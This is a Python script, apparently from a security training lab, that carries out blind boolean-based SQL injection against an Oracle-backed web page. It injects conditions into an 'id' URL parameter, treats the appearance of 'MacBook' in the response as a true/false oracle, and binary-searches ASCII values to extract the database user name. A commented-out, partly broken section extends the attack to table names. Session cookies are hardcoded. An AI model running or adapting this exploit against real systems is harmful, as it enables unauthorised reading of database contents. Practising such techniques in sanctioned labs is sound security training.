import requests

url = "https://elms2.skinfosec.co.kr:8110/practice/practice01/detail?id=62 and {}"

cookies = {
    "JSESSIONID":"769A200B19E9C1EBC752A3B4D4B53B01"
}

# select user from dual
# 유저명의 길이 : (select length(user) from dual) = 1

#select subtr(user,1~length,1) from 32~126

query = "(select length(user) from dual) = {}"
length = 0
for i in range(1,100):
    attackQuery = query.format(i)
    print(attackQuery)
    attackUrl = url.format(attackQuery) 
    response = requests.get(attackUrl, cookies=cookies)
    if "권한이" in response.text:
            print("쿠키값 새로 넣기!")
            break
    if "MacBook" in response.text:
        print("참")
        length = i
        break
    else:
        print("거짓")



#select subtr(user,1~length,1) from dual = 32~126

import requests

url = "https://elms2.skinfosec.co.kr:8110/practice/practice01/detail?id=62 and {}"
cookies = {"JSESSIONID":"962C9A16C3E04A9F122A2865ABB85CDB"}

def binarySearch(query):
    baseQuery = "(" + query + ")" + "> {}"
    min = 1
    max = 127
    while min < max:
        avg = int((min + max) / 2)
        attackQuery = baseQuery.format(avg)        
        attackUrl = url.format(attackQuery)
        response = requests.get(attackUrl, cookies=cookies)
        if "MacBook" in response.text:            
            min = avg + 1                    
        else:
            max = avg            
    return min

# for i in range(1, 9):    
#     query = "(select ascii(substr(user,{},1)) from dual)".format(i)
#     ascii = binarySearch(query)
#     print("{}번째 글자 : {}".format(i, chr(ascii)))




#유저명
#select user from dual
#깉이 : select length(user) from dual
#한글자씩: select ascii(substr(user, 1-length, 1)) from dual

query = "select length(user) from dual"
userlength = binarySearch(query)
print("유저명의 길이 : {} 글자".format(userlength))

user=""
for i in range(1, userlength + 1):
    query = "select ascii(substr(user, {},1)) from dual"
    ascii = binarySearch(query)
    user = user + chr(ascii)
    print(user)
    print("유저명 : {}".format(user))

#테이블명
#seelct table_name from user_tables
#1. 테이블의 개수
#select count(table_name) from user_tables
#2. 테이블을 1 row
#select table_name, rownum as ln from user_tables) where ln = 1~count
#3. 테이블 1row의 문자열의 길이
#select length(table_name) from (select table_name, rownum as ln from user_tables) where ln = 1-conut
#4. 테이블 1 row의 문자열을 1글자씩
#select ascii(substr(table_name,{},1)) from (select table_name, rownum as ln from user_tables) where ln = {}

# query = "select count(table_name) from user_tables"
# tableCount = binarySearch(query)
# print("테이블의 개수 : {} 개".format(tableCount))

# for i in range(1, tableCount + 1):
#     query  = "select ascii(substr(table_name,{},1)) from (select table_name, rownum as ln from user_tables) where ln = {}".format(j,i)
#     tableLength = binarySearch(query)
#     print("{} 번째 테이블 이름의 문자열 길이 : {} 글자".format(i, tableLength))

#     for j in range(1, tableLength + 1):
#         query = "select ascii(substr(table_name, {},1)) from (select table_name, rownum as ln from user_tables) whereln = {}".format(j,i)
#         ascii = baseQuery(query)
#         table = table + chr(ascii)
#         print("테이블 : {}".format(table))







